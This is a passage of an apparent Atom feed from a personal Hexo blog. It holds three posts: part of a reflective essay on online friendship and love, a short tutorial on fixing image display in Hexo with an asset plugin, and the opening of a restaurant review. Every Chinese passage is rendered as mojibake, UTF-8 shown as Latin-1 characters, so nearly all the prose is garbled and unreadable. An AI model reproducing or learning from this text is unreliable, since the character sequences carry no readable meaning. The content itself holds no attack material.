·çš„è½¨è¿¹ï¼Œä½†å´ä¸°æ»¡è€Œæ·±åˆ»ã€‚æ‹äº†å¾ˆå¤šè¿™ä¸ªä½ç½®è¿™ä¸ªè§†è§’ä¸‹çš„ç…§ç‰‡ï¼Œæ¯ä¸€å¼ éƒ½ä¸ä¸€æ ·ï¼Œæƒ…ç†ä¹‹ä¸­ã€‚ä¸è¿‡è¿™é‡Œä¸æ˜¯è¯´æ™¯è‰²çš„æ­é…ä¸ä¸€æ ·ï¼Œè€Œæ˜¯ä»–ä»¬æ‰€å±•ç°çš„åŠ›é‡ï¼Œæ˜¯è‰²å½©çš„çµæ´»æ­é…ä¸‹æ·±åº¦å±•ç°ç»™æˆ‘ï¼Œå¸¦ç»™æˆ‘éœ‡æ’¼æ„Ÿçš„ä¸œè¥¿ã€‚    </p><p>å¤©ç©ºæ˜¯ä¼šè¯´è¯çš„ï¼Œå¦‚æœä½ ç”¨å¿ƒè¯´ï¼Œå¦‚æœä½ ç”¨å¿ƒå¬ã€‚é‚£æ®µæ—¥å­ï¼Œè™½ç„¶å¤§äººä»¬çœ‹æ¥æ˜¯â€œå¾ˆæ— èŠçš„å‘å‘†â€ï¼Œè‡ªå·±å´è§‰å¾—æ˜¯æ„å¤–çš„å……å®ä¸æ»‹æ¶¦ã€‚     </p><h2 id="äºŒã€äº¤å¿ƒ"><a href="#äºŒã€äº¤å¿ƒ" class="headerlink" title="äºŒã€äº¤å¿ƒ"></a>äºŒã€äº¤å¿ƒ</h2><p>å‰æ®µæ—¶é—´å›å½’äº†ä¸€ä¸‹ä»¥å‰ç©è¿‡çš„ä¸€æ¬¾æ¸¸æˆï¼Œæœç„¶è¿˜æ˜¯çƒ­çˆ±ç€RPGå‘¢ã€‚å› ä¸ºå‰§æƒ…å’Œåœ°å›¾äººè®¾éƒ½è§‰å¾—åšå¾—ä¸é”™ï¼Œå°±å®‰åˆ©ç»™äº†å¥³å‹ï¼Œä¸€èµ·ç©äº†ä¼šå„¿ï¼Œä¹Ÿç®—æ˜¯äº†äº†ä¸€ä¸ªå¿ƒæ„¿å‘¢ã€‚æƒŠå–œçš„æ˜¯å¥¹ä¹Ÿå¾ˆå–œæ¬¢è¿™æ¬¾æ¸¸æˆï¼Œä¸è¿‡éšç€ç­‰çº§çš„ä¸Šå‡ï¼Œé‡åˆ°ä½¿ç”¨ç¬¬ä¸‰æ–¹æ’ä»¶çš„<del>ç©å®¶</del>è¶Šæ¥è¶Šå¤šï¼Œä¸å¯¹ï¼Œä¸åº”è¯¥ç§°ä½œç©å®¶ï¼Œè€Œæ˜¯å•†äººå§ã€‚æŠ¢å ç€åœ°å›¾ä¸é“å…·ï¼ŒæŠŠæ­£å¸¸ç©å®¶æŒ¤ä¸‹çº¿ï¼Œå¹¶ä¸¥é‡é˜»ç¢ç€ä»»åŠ¡çš„å®Œæˆåº¦ã€‚   </p><p>è¿™æ˜¯æ¬¾å†·äº†å¾ˆä¹…çš„æ¸¸æˆï¼Œå½“åˆé€€å‡ºå®ƒå°±æ˜¯å› ä¸ºè¿‡åˆ†çš„å•†ä¸šåŒ–ï¼Œè€Œä»£ç†å•†å¹¶æ²¡æœ‰è§£å†³é—®é¢˜çš„åŠ›é‡ï¼Œä¸å¦‚è¯´ä¸æ„¿å»è§£å†³å§ã€‚åƒç›¸å¹¶ä¸å¥½çœ‹ã€‚å¥½å¥½çš„æ¸¸æˆä½“éªŒï¼Œåªèƒ½åœ¨å›å¿†é‡Œä½“éªŒåˆ°äº†ã€‚å³ä½¿å–œæ¬¢ç€æ¸¸æˆæœ¬èº«ï¼Œå¥³å‹ä¹Ÿå› ä¸ºå—ä¸äº†è¿™ç‚¹ï¼Œä¸å‡ºå‡ æ—¥ä¾¿åˆ äº†æ¸¸æˆã€‚æœ‰å¤ªå¤šçš„è„è¯æƒ³è¯´ã€‚ç„¶è€Œè¯¥è¯´çš„å‡ å¹´å‰å°±è¯´äº†ï¼Œç°åœ¨èƒ½æ‰¾åˆ°ä¸€äº›è®°å¿†é‡Œçš„ä½“éªŒå°±å·²ç»å¾ˆæ£’äº†ã€‚  </p><p>é™¤äº†è¿™æ¬¾æ¸¸æˆï¼Œè¿˜æœ‰çš„æ¯”è¾ƒæ·±å°è±¡çš„æ˜¯åˆä¸­çš„æ—¶å€™é€›ç€è´´å§æ‰¾åˆ°äº†[å¼‚æ¬¡å…ƒæœåŠ¡å™¨]ï¼Œä¸€ä¸ªç”¨æœåŠ¡å™¨æ­ç€MCè¿›è¡Œæ¸¸æˆçš„å°åœˆå­ã€‚ä»¥å‰è§‰å¾—å¼„æœåŠ¡å™¨ä»€ä¹ˆçš„å¾ˆå‰å®³ï¼Œä½†æ˜¯åæ¥æ‰çŸ¥é“å…¶ä¸­å¤§éƒ¨åˆ†äººæ˜¯æ¯”è‡ªå·±è¿˜å°çš„ï¼Œä¹Ÿæ›´è¯´æ˜äº†å­©å­çš„å­¦ä¹ èƒ½åŠ›çš„å¼ºåŠ›å‘¢ã€‚å½“ç„¶æˆ‘åœ¨è¿™é‡Œæƒ³è¯´çš„ä¸æ˜¯æ¸¸æˆçš„ä½“éªŒï¼Œè€Œæ˜¯ä¸€äº›å…¶ä»–çš„ä¸œè¥¿ã€‚ä¸€èµ·ç©è¿‡æ¸¸æˆçš„äººï¼Œæœ‰çš„å·²ç»ç»“å©šç”Ÿå­ï¼Œæœ‰çš„è¿˜åœ¨ç§¯æå¤‡è€ƒï¼Œæœ‰çš„æ˜¯å’Œè‡ªå·±ä¸€æ ·æˆ–è€…ç›¸ä¼¼çš„äººã€‚å¾ˆå¤šäººå¯èƒ½éƒ½æ²¡æœ‰è§è¿‡é¢ï¼Œä½†æ˜¯ç°åœ¨è¿˜æœ‰ç€ä¸€äº›è”ç³»ï¼Œå¾ˆæ„ŸåŠ¨ã€‚åœ¨è¿™ç§å……æ–¥ç€ä¸ä¿¡ä»»çš„æ—¶ä»£é‡Œï¼Œè¿™ç§æ¸©æš–æ˜¾å¾—éš¾å¾—å¯è´µï¼Œå³ä½¿éš”ç€å±å¹•ï¼Œä¹Ÿèƒ½æ„Ÿå—åˆ°ä¸€äº›äº²å’Œã€‚  </p><p>æˆ‘ç§°è¿™ç§ä½“éªŒä¸ºäº¤å¿ƒã€‚    </p><p>å½“ç„¶ç¦»æˆ‘ä»¬æ›´è¿‘çš„äº¤å¿ƒä½“éªŒè¿˜æ˜¯æœ‹å‹é—´ï¼Œæ‹äººé—´çš„ã€‚å—¯ä¹Ÿå€Ÿè¿™ä¸ªæœºä¼šè°ˆè°ˆä¸€äº›æ‹çˆ±è§‚ä¸è®¾æƒ³å§ã€‚   </p><p>å…¶å®æˆé•¿åˆ°ç°åœ¨ï¼Œä¸ä»…æ˜¯è‡ªå·±ï¼Œæ•´ä¸ªç¤¾ä¼šçš„æ‹çˆ±è§‚éƒ½åœ¨å‘ç”Ÿç€å˜åŒ–ï¼Œä»ä»¥å‰çš„è¿é å¾—å¾ˆè¿‘éƒ½è§‰å¾—æ˜¯ç§ç¾è€»çš„æ—¶ä»£åˆ°äº†å¯ä»¥å¤§èƒ†å»è¡¨è¾¾ï¼Œè¡¨ç°çˆ±çš„æ—¶ä»£ï¼Œè§‰å¾—ä¹Ÿæ˜¯ç§è¿›æ­¥å‘¢ï¼Œä¹Ÿæ˜¯ç§è§£æ”¾ã€‚å¹´è½»äººä»¬æœ‰ç€è‡ªå·±çš„æ–¹å¼ä¸ç†è§£å»å†³å®šå¦‚ä½•å»çˆ±ï¼Œæœ€ä¸»è¦çš„æ˜¯å¦‚ä½•å»é€‰æ‹©å¯¹è±¡ä¸å¯¹è‡ªå·±èº«ä½“çš„å¼€æ”¾ç¨‹åº¦ï¼Œæ¯”å¦‚ç°åœ¨çš„å‹¾è‚©æ­èƒŒæ‚æŠ±å¯èƒ½æ˜¯ä»¥å‰çš„äººæ‰€æ— æ³•æ¥å—çš„å‘¢ã€‚å½“ç„¶è¿œä¸æ­¢è¿™äº›ã€‚    </p><p>è¿™äº›æ¦‚æ‹¬èµ·æ¥å¤§è‡´æ˜¯[é€‰æ‹©æƒ]çš„æå‡å§ï¼Œè¯´èµ·æ¥æœ¬è¯¥æ‹¥æœ‰çš„ä¸œè¥¿ç°åœ¨è¢«èµ‹äºˆäº†æˆ–è€…è¯´äº‰å–åˆ°äº†è¿˜è§‰å¾—å¼€å¿ƒï¼Œå…¶å®æœ‰ç‚¹å¥‡æ€ªçš„å‘¢ã€‚  </p><p>è¿™ä¸–ç•Œï¼Œä¸¤ä¸ªäººï¼Œèƒ½ç›¸é‡ï¼Œä¸å®¹æ˜“ã€‚</p><p><img src="/posts/the-seed/3.png" alt=""></p><p>å½“è°ˆåŠæ‹çˆ±çš„æ—¶å€™ï¼Œæˆ‘è§‰å¾—ä¸ç®¡æ˜¯åœ¨å“ªä¸ªå¹´é¾„ï¼Œéƒ½ä¸è¯¥å«ç€ä¸€ç§ç¾è€»å¿ƒï¼Œæœ€å¸¸è§çš„å°±æ˜¯ä½ æ¯”é‚»å±…å®¶çš„æŸä¸ªå“¥å“¥å§å§è¦æ—©æœ‰ç”·ç¥¨å¥³ç¥¨ï¼Œä½ çš„çˆ¸å¦ˆå¯èƒ½ä¼šè§‰å¾—æœ‰æŸç§â€œä¸å¦¥â€ï¼Œç”šè‡³å¯¹æ–¹åˆ°å®¶é‡Œæ¥ç©éƒ½è¦é®é®æ©æ©ä¸å¥½æ„æ€ï¼Œè¿™æœ¬èº«å°±æœ‰ä¸€ç§ä¸åˆç†çš„æˆåˆ†åœ¨ã€‚çˆ±çš„ç»è¥å¥½æ¯”å•†ä¸šï¼Œç”šè‡³æ¯”ç»å•†è¿˜è¦å¤æ‚ï¼Œé‚£ä¹ˆäººä»¬æ˜¯å¦ä¼šå› ä¸ºä½ å¹´çºªè½»è½»æ¯”å‘¨å›´çš„ä¸­å¹´å·¥ä½œå…šè¿˜èµšå¾—å¤šè€Œæ„Ÿåˆ°ç¾è€»å˜›ï¼Ÿæ˜¾ç„¶ä¸ä¼šï¼Œä»–ä»¬è¿˜ä¼šå¤¸è¿™æ ·çš„ä½ ã€‚é‚£ä¹ˆä¸ºä»€ä¹ˆæ”¾åˆ°æ‹çˆ±è¿™è¾¹ä¼šæœ‰è¿™æ ·çš„å·®åˆ«å‘¢ï¼Œå…¶å®è¿˜æ˜¯ä¸€ç§ç‰©è´¨ä¸–ç•Œä¸ç²¾ç¥ä¸–ç•Œçš„æ­é…ä¸å‡ï¼Œæˆ–è€…è¯´æŸç§ä¼ ç»Ÿçš„åè§æŸç¼šæ‰€å¼•èµ·çš„ï¼Œé‚£ä¹ˆçˆ±ä¸æ€§çš„è§£æ”¾ï¼Œå…¶å®è¿˜æœ‰å¾ˆé•¿ä¸€æ®µè·¯è¦èµ°ã€‚æˆ‘ä»¬æ‰€å…³æ³¨çš„ï¼Œåº”è¯¥æ˜¯å¦‚ä½•å»å¼•å¯¼è‡ªå·±æˆ–è€…è‡ªå·±çš„å­©å­ï¼Œå»æå‡æ•´åœºæ„Ÿæƒ…çš„è´¨é‡ï¼Œè€Œéå† å†•çš„â€œä¸ºäº†ä½ å¥½ä»¥xxä¸ºé‡ä¸èƒ½è¿™æ ·ä¸èƒ½è¿™æ ·â€ï¼Œè¿™æ˜¯ç§å‹åˆ¶ï¼Œè€Œéåˆ©äºä»–æˆé•¿çš„ä½“éªŒã€‚    </p><p>æœ‰å¹¸æ•æ‰åˆ°ä¸€åªæœ‰ç›¸è¿‘ç›®æ ‡çš„å¥³ç¥¨ï¼Œå¹¶ä¸ä¼šè§‰å¾—å°†æ¥ä¼šå› ä¸ºä¸“ä¸šçš„é‡åˆè€Œä½¿å¾—ä¹è¶£ä¸åœˆå­é‡åˆè€Œé€ æˆä¹è¶£çš„å‡å°‘ï¼Œå½“ç„¶ä¸‹ä¸€ç« ä»»åŠ¡çš„è§£é”ä¸æˆå°±çš„ä½“éªŒä¼šéœ€è¦ç°åœ¨çš„ä¸€äº›åŠªåŠ›ä¸æŠ•å…¥ï¼Œå¬èµ·æ¥æœ‰ç‚¹æ•™æ¡ï¼Œä½†è¿˜æ˜¯è¿™ä¸ªç†å‘¢XDã€‚ä½ æ²¡åŠæ³•è¯´ï¼Œç°åœ¨é ç€å®¶é•¿äº«å—ç€ä¸€äº›ä¸œè¥¿ï¼Œä»¥åä¹Ÿå¯ä»¥è¿™æ ·ã€‚æ— æµäºäº‹å¯èƒ½æ¥è‡ªäºè‡ªå·±çš„æ— èƒ½ä¸ºåŠ›ï¼Œè¿™ç§æ„Ÿè§‰ä¼šéå¸¸ç—›è‹¦ã€‚</p><p>é•¿ä¹…çš„é™ªä¼´èåˆå¹¶ä¸æ˜¯è®©ä¸€ä¸ªäººå»è¿å°±å¦ä¸€ä¸ªäººï¼Œå¯èƒ½å¾ˆå¤šç”·ç”Ÿä¼šè§‰å¾—ä¸€ç›´å“„ä¸€ç›´å® ç€å¥³ç¥¨å°±å¯ä»¥ï¼Œå¾ˆå¤šäººè§‰å¾—ä»¥åè‚¯å®šä¼šè¿™ä¹ˆåšï¼Œç„¶è€Œè¿™å…¶å®ä¸æ˜¯å¥åº·çš„æ„Ÿæƒ…ï¼Œçˆ±æ˜¯åŒå‘çš„ï¼Œä½ çš„æ¸©æŸ”ä¸åŒ…å®¹æ˜¯å¿…é¡»çš„ï¼Œä½†æ˜¯åŒæ—¶ä½ å¸å¼•å¯¹æ–¹çš„ï¼Œä¸€å®šä¸æ˜¯å¦‚ä½•å® æººï¼Œè€Œæ˜¯ä½ æœ¬èº«ã€‚å¸¦ç»™å¥¹æ— é™å…³æ€€çš„å¯èƒ½ä¸æ­¢ä½ ä¸€ä¸ªäººèƒ½åšåˆ°ï¼Œä½†æ˜¯è¦ç‰¢ç‰¢å¾—ç”¨è‡ªèº«å»å¸å¼•å¥¹çš„ï¼Œåªæœ‰ä½ èƒ½åšåˆ°ã€‚å¦‚æœå¯¹æ–¹ä¸€ç›´æ²¡æœ‰ä»€ä¹ˆäº®ç‚¹çš„è¯ï¼Œä½ ä¼šè§‰å¾—å„ç§å¯¹è‡ªå·±çš„å¥½éƒ½æ˜¾å¾—é‚£ä¹ˆæ™®é€šï¼Œè€Œå¦‚æœæ˜¯ä¸æ–­å¸å¼•ç€è‡ªå·±çš„äººå‘¢ï¼Œå…¶å®ç¨å¾®å¯¹ä½ çš„æ³¨æ„ä¸å…³æ€€éƒ½ä¼šæ„Ÿè§‰åƒæ˜¯ä¸Šå¸çš„æ©èµä¸€èˆ¬ï¼Œç”šè‡³æ•´å¤©çš„å¿ƒæƒ…éƒ½æ˜¯é‚£ä¹ˆæ£’ã€‚   </p><p>å¯ä»¥åœ¨åšç€ä¸ä¸€æ ·çš„äº‹ï¼Œå¯ä»¥æœ‰ç€ä¸åŒè®¤è¯†çš„äººï¼Œä½†æ˜¯ä½ ä¼šæˆä¸ºå¥¹çš„ä½æ‰€ï¼Œä¼šæ˜¯å¥¹æ„¿æ„å›æ¥ä¸”èƒ½æ„Ÿåˆ°å®‰å¿ƒçš„åœ°æ–¹ï¼Œä½ ä»¬ä¹‹é—´å¯ä»¥æœ‰æŠ±æ€¨ï¼Œä½†æ˜¯æ²¡æœ‰çŒœç–‘ï¼›å¯ä»¥æœ‰å«Œå¼ƒï¼Œä½†ä¹Ÿæœ‰è¿·äººçš„éƒ¨åˆ†ï¼Œä»…æ­¤ä¸€äººã€‚æ¯å¤©é‡å¤ç€ä¸€æ ·çš„åŠ¨ä½œï¼Œä»…ä»…æ˜¯åƒé¥­ç¡è§‰ä¸€èµ·ä¸Šè¯¾ï¼Œä¼šæ˜¾å¾—ç–²å€¦ï¼Œäºæ˜¯å¯ä»¥å°è¯•ç€åŠ äº›åˆ›æ„ï¼Œå› ä¸ºæœ‰å¥¹ï¼Œä½ æœ‰æºæºä¸æ–­çš„ç‚¹å­ï¼Œå› ä¸ºæ˜¯å¥¹ï¼Œæ‰€ä»¥ä½ æ„¿æ„å»æŠ•å…¥ä¸€å®šçš„æ—¶é—´å»å‡†å¤‡è¿™äº›å°æƒŠå–œï¼Œè€Œåœ¨å±äºè‡ªå·±çš„æ—¶é—´ï¼Œæœ€å¤§æ•ˆç‡åœ°å®Œæˆå­¦ä¹ ï¼Œå®Œæˆå·¥ä½œï¼Œæˆå°±è‡ªå·±ã€‚å»æ‰“é€ æ·±åŒ–è‡ªå·±æ‹¥æœ‰çš„ä¹Ÿä¸æ–­å¸å¼•ç€å¥¹çš„ä¼˜ç‚¹ï¼Œå»å¢å¼ºè‡ªå·±çš„èƒ½åŠ›ä»¥å»æ›´å¥½åœ°å®ˆæŠ¤å¥¹ï¼Œå®ˆæŠ¤è¿™æ®µæ„Ÿæƒ…ï¼Œå®ˆæŠ¤è‡ªå·±ã€‚è¿™ä¸ªè¿‡ç¨‹ä¸ä¼šç®€å•ï¼Œå…¶ä¸­å¿…å®šä¼šæœ‰ä¸ç†è§£ä¸å°å§”å±ˆï¼Œä½†æ˜¯åªè¦é¢å¯¹ç€å¯¹æ–¹çš„æ˜¯çœŸå®çš„å†…å¿ƒï¼Œè¿™äº›éƒ½å¾ˆå®¹æ˜“è§£å†³ã€‚</p><p>ä¹Ÿå¸Œæœ›è‡ªå·±èƒ½å¤Ÿæˆé•¿ä¸ºå¯ä»¥ç‹¬æŒ¡ä¸€é¢ï¼Œæˆç†Ÿçš„äººã€‚</p><p>ç¥æ„¿ï¼Œç¥ç¦ã€‚    </p><p>ä»¥ä¸Šã€‚</p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;åªæ˜¯ä½ ä¸çŸ¥é“æˆ‘çš„ç‹‚é‡ã€‚&lt;/p&gt;
    
    </summary>
    
      <category term="ç…®å­—" scheme="https://cyris.pen.moe/categories/%E7%85%AE%E5%AD%97/"/>
    
    
      <category term="ç…®å­—" scheme="https://cyris.pen.moe/tags/%E7%85%AE%E5%AD%97/"/>
    
  </entry>
  
  <entry>
    <title>Hexo åšå®¢å›¾ç‰‡é—®é¢˜è§£å†³åŠæ³•</title>
    <link href="https://cyris.pen.moe/posts/blog-picture-issue/"/>
    <id>https://cyris.pen.moe/posts/blog-picture-issue/</id>
    <published>2017-07-12T11:46:06.000Z</published>
    <updated>2018-04-01T06:37:12.000Z</updated>
    
    <content type="html"><![CDATA[<p>å…³äºhexoåšå®¢å›¾ç‰‡æ— æ³•æ­£å¸¸æ˜¾ç¤ºçš„é—®é¢˜çš„è§£å†³åŠæ³•ã€‚   </p><a id="more"></a><p>ä¹‹å‰ä¸€ç›´ç”¨çš„MarkdownPad2è‡ªå¸¦çš„æ·»åŠ å›¾ç‰‡æŒ‰é’®æ¥æ·»åŠ å›¾ç‰‡ï¼ˆå­˜å‚¨åœ¨hexo/source/imagé‡Œï¼‰ï¼Œä½†æ˜¯ç»å¸¸ä¼šæœ‰æ˜¾ç¤ºä¸å‡ºçš„æƒ…å†µï¼Œä¸å–œæ¬¢ç”¨å„å¤§å›¾åºŠï¼Œäºæ˜¯æŸ¥äº†ä¸€æ³¢æœ¬åœ°å­˜å‚¨ä¸Šä¼ çš„æ–¹æ³•ï¼Œæ‰¾åˆ°äº†ä¸€ä¸ª<a href="https://github.com/CodeFalling/hexo-asset-image" target="_blank" rel="noopener">æ’ä»¶</a>æ¥ä¿®æ­£imgæ ‡ç­¾ä»¥ä½¿å›¾ç‰‡æ­£å¸¸æ˜¾ç¤ºã€‚  </p><p>å‚è€ƒè‡ª<a href="http://www.jianshu.com/p/c2ba9533088a" target="_blank" rel="noopener">ç®€ä¹¦</a>ã€‚   </p><h2 id="0x01-Assetè®¾å®šç¡®è®¤"><a href="#0x01-Assetè®¾å®šç¡®è®¤" class="headerlink" title="0x01 Assetè®¾å®šç¡®è®¤"></a>0x01 Assetè®¾å®šç¡®è®¤</h2><p>é¦–å…ˆç¡®è®¤_config.yml ä¸­æœ‰ post_asset_folder:trueã€‚<br>è¿™æ—¶å€™æ¯æ¬¡hexo newä¼šè‡ªåŠ¨å»ºç«‹ä¸€ä¸ªä¸æ–‡ç« åŒåçš„æ–‡ä»¶å¤¹ï¼Œæˆ‘ä»¬å¯ä»¥æŠŠä¸è¯¥æ–‡ç« ç›¸å…³çš„æ‰€æœ‰èµ„æºéƒ½æ”¾åˆ°é‚£ä¸ªæ–‡ä»¶å¤¹ï¼Œæ¥æ›´æ–¹ä¾¿å¾—è°ƒç”¨èµ„æºã€‚     </p><h2 id="0x02-æ’ä»¶æ·»åŠ "><a href="#0x02-æ’ä»¶æ·»åŠ " class="headerlink" title="0x02 æ’ä»¶æ·»åŠ "></a>0x02 æ’ä»¶æ·»åŠ </h2><p>åœ¨hexoæ–‡ä»¶å¤¹æ‰§è¡Œï¼š  </p><blockquote><p>   npm install <a href="https://github.com/CodeFalling/hexo-asset-image" target="_blank" rel="noopener">https://github.com/CodeFalling/hexo-asset-image</a> â€“save</p></blockquote><h2 id="0x03-å›¾ç‰‡æ·»åŠ "><a href="#0x03-å›¾ç‰‡æ·»åŠ " class="headerlink" title="0x03 å›¾ç‰‡æ·»åŠ "></a>0x03 å›¾ç‰‡æ·»åŠ </h2><p>å®Œæˆå®‰è£…åæ–°å»ºä¸€ä¸ªæ–‡ä»¶è¯•è¯•ï¼Œå‘ç°åœ¨.mdæ–‡ä»¶åŒçº§ç›®å½•ä¸‹ä¼šæœ‰ä¸€ä¸ªåŒåæ–‡ä»¶å¤¹ã€‚<br>æ¯”å¦‚æˆ‘ä»¬æ–°å»ºäº†ä¸€ä¸ªæ–‡ä»¶blog-picture-issue.mdï¼Œç„¶ååœ¨åŒåæ–‡ä»¶å¤¹é‡Œæ”¾å¼ å›¾ï¼š1.pngã€‚   </p><p>ä¹‹ååœ¨åŸå›¾ç‰‡å¼•ç”¨è¯­å¥çš„æ‹¬å·é‡Œå†™å…¥ï¼š  </p><blockquote><p>   blog-picture-issue/1.PNG</p></blockquote><p>å°±èƒ½çœ‹åˆ°æ­£å¸¸æ˜¾ç¤ºçš„å›¾ç‰‡äº†ï¼š   </p><p><img src="/posts/blog-picture-issue/1.png" alt="">    </p><p>æ³¨ï¼š[]é‡Œæ˜¯å›¾ç‰‡çš„åç§°ï¼Œå¯ä¸å†™ã€‚   </p><h2 id="0x04-issued"><a href="#0x04-issued" class="headerlink" title="0x04 issued"></a>0x04 issued</h2><p>è¿™æ ·çš„æ“ä½œä»¥åç”Ÿæˆçš„htmlæ˜¯ï¼š   </p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">"/2017/07/12/blog-picture-issue/1.PNG"</span> <span class="attr">alt</span>=<span class="string">"logo"</span>&gt;</span></span><br></pre></td></tr></table></figure><p>è€Œéä¹‹å‰çš„ï¼š  </p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">"blog-picture-issue/1.PNG"</span> <span class="attr">alt</span>=<span class="string">"logo"</span>&gt;</span>â€</span><br></pre></td></tr></table></figure><p>ä½¿å¾—å›¾ç‰‡æ­£å¸¸æ˜¾ç¤ºã€‚</p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;å…³äºhexoåšå®¢å›¾ç‰‡æ— æ³•æ­£å¸¸æ˜¾ç¤ºçš„é—®é¢˜çš„è§£å†³åŠæ³•ã€‚   &lt;/p&gt;
    
    </summary>
    
      <category term="Hexo" scheme="https://cyris.pen.moe/categories/Hexo/"/>
    
    
      <category term="HEXO" scheme="https://cyris.pen.moe/tags/HEXO/"/>
    
  </entry>
  
  <entry>
    <title>è èç‰›è‚‰é¥­</title>
    <link href="https://cyris.pen.moe/posts/tea-maker/"/>
    <id>https://cyris.pen.moe/posts/tea-maker/</id>
    <published>2017-07-02T03:54:20.000Z</published>
    <updated>2018-03-30T10:10:45.000Z</updated>
    
    <content type="html"><![CDATA[<p>è èï¼Œé’èœï¼Œç‰›è‚‰ï¼Œç±³é¥­ï¼ŒèŠéº»ï¼Œç•ªèŒ„è›‹æ±¤ã€‚      </p><a id="more"></a>   <h2 id="ä¸€ã€ç•ªèŒ„è›‹æ±¤ç²¾çµ"><a href="#ä¸€ã€ç•ªèŒ„è›‹æ±¤ç²¾çµ" class="headerlink" title="ä¸€ã€ç•ªèŒ„è›‹æ±¤ç²¾çµ"></a>ä¸€ã€ç•ªèŒ„è›‹æ±¤ç²¾çµ</h2><p>æŒºå–œæ¬¢é¦™æ¸¯å²›çš„è€æ¿çš„ï¼Œä¸€ä¸ªå¸¦ç‚¹å¹¿ä¸œå£éŸ³çš„å¤§å”ï¼Œåº—é‡Œæœ‰é±¼æœ‰çŒ«ï¼Œé è¿‘é—¨å£çš„åœ°æ–¹æœ‰å¼ å°æ¡Œå­ï¼Œä¸Šé¢å †äº†äº›æœ‰ç§å¹´ä»£æ„è±¡çš„ç©ç‰©ï¼Œå¹³æ—¶æˆ´ç€ç»†æ¡†çœ¼é•œï¼Œå¾ˆæ˜¯å‹å¥½ï¼Œä¹°å•æ—¶ä¼šè·Ÿä½ è¯´è°¢è°¢ï¼Œå¾ˆå¹³é™çš„é‚£ç§ï¼Œé™åˆ°ç›´æ·±å¿ƒéª¨ï¼Œå£°éŸ³æœ‰ç§å¤§æ¼ èˆ¬çš„é¥±æ»¡ï¼Œæ€»ä¹‹å…‰é‚£å‡ å£°è°¢è°¢ï¼Œä¹Ÿä¼šå†ä¸€æ¬¡è¿›åº—äº«é£Ÿã€‚   </p><p>åœ¨è¿™é‡Œç”¨é¤è¿˜æ˜¯æŒºå¥¢ä¾ˆçš„ï¼Œä¸¤ä¸ªäººå¯ä»¥åƒåˆ°50+ï¼Œä½†æ˜¯ä¸œè¥¿é‡å¾ˆè¶³ï¼Œç¬¬ä¸€æ¬¡æ¥ç‚¹èœéš¾å…ä¼šæµªè´¹ï¼Œé‡è¶³çš„åŒæ—¶å‘³ä¹Ÿå¾ˆè¶³ï¼Œæ•´ä¸ªåº—éƒ½æœ‰è€æ¿çš„é‚£ç§æ°”è´¨ï¼Œå°è±¡æ¯”è¾ƒæ·±çš„ä¾¿æ˜¯é‚£ä»½è èç‰›è‚‰é¥­ï¼Œæ±æ¶²åŒ…è£¹ç€è èé’èœä¸ç‰›è‚‰ï¼Œè¿™äº›é£Ÿæçš„å‘³é“åˆé”åœ¨äº†æ±¤æ±é‡Œï¼Œäº¤é”™ç›¸å…³ï¼Œå¾ˆæ˜¯èæ´½ã€‚ç±³é¥­è™½ä¹Ÿåœ¨ä¸€ä¸ªç›˜å­é‡Œå´ä¿æŒç€å¾ˆéš¾å¾—çš„å¹²å‡€ï¼Œå¤«äººä¼šå¾ˆå–œæ¬¢è¿™æ ·çš„ç±³é¥­ï¼Œæœ‰ç€å®ƒè¯¥æœ‰çš„ç‹¬ç«‹å‰”é€çš„å‘³é“ã€‚æˆ‘æ¯”è¾ƒå–œæ¬¢å–æ±¤ï¼Œæ‰€ä»¥è¿™ä»½é¥­åˆ°æœ€ååŸºæœ¬ä¼šè¢«æˆ‘ç”¨æ±¤æ±æµ‡æ·‹å…¨èº«ï¼Œç±³é¦™å³è¢«å›°åœ¨äº†ä¸€å±‚é€æ˜ä¸æ»‘ä¹‹ä¸‹ã€‚åƒå¾—å¾ˆæ„‰å¿«ã€‚è€æ¿å¨˜è¿˜å¾ˆè´´å¿ƒçš„é€äº†ä»½ç•ªèŒ„è›‹æ±¤ï¼Œå‘³é“ä¹Ÿå¾ˆå‡ºè‰²ã€‚è¯´åˆ°ç•ªèŒ„è›‹æ±¤ï¼Œä¸å¾—ä¸æä¸€ä¸‹ç•ªèŒ„è›‹æ±¤ç²¾çµ@Acalephï¼Œé ä¸€ç¢—æ±¤å°±å¯ä»¥è®©æˆ‘åƒå®Œä¸€é¡¿é¥­çš„æ°´æ¯å®è´ã€‚   </p><p>â€œæˆä¸ºä¼˜ç§€å¨å¸ˆçš„è¯€çªå°±æ˜¯â€¦é‡ä¸Šä¸€ä¸ªè¶³ä»¥è®©ä½ æƒ³è¦å°†è‡ªå·±æ‰€æœ‰çš„æ–™ç†ï¼Œéƒ½çŒ®ç»™å¥¹çš„å¥³äººã€‚â€ â€”â€” é£ŸæˆŸä¹‹çµ    </p><p>æœ€æ—©æ¥è¿™é‡Œæ˜¯æ©™å­ä»‹ç»çš„ï¼Œå–çš„ç”Ÿæ»šç²¥ï¼Œè‚‰ç‰‡ç…®å¾—å¾ˆæœ‰åŠ›åº¦ï¼Œé‡ä¹Ÿå¾ˆå¤Ÿï¼Œä¸€ä»½ç²¥ä¸¤ä¸ªäººä¹Ÿå¯ä»¥åƒé¥±ã€‚é‡Œè¾¹è¿˜æœ‰å‡ ç‰‡ç”Ÿèœï¼Œå¦–å¨†å¾—èººåœ¨ç²¥é‡Œï¼Œå¿ä¸ä½æƒ³æªå‡ºæ¥å’¬å‡ å£ã€‚ç”Ÿæ»šç²¥å½“ç„¶ä¸»è¦å“çš„æ˜¯ç²¥å•¦ï¼Œç²¥ä¹Ÿæ˜¯å¾ˆæ£’ï¼Œè®°å¾—è¿ç»­åƒäº†å¥½å‡ å¤©ï¼Œå®ƒä¸ç››æ”¾å®ƒçš„é»‘è‰²ç ‚é”…æœ‰ç€ç›¸è¿‘çš„å‘³é“ï¼Œä¹Ÿè¡¨ç°ç€è€æ¿çš„é‚£ç§æ°”è´¨â€”â€”é¥±æ»¡æ²§æ¡‘å´è¿‘äººæœ‰åŠ›ã€‚   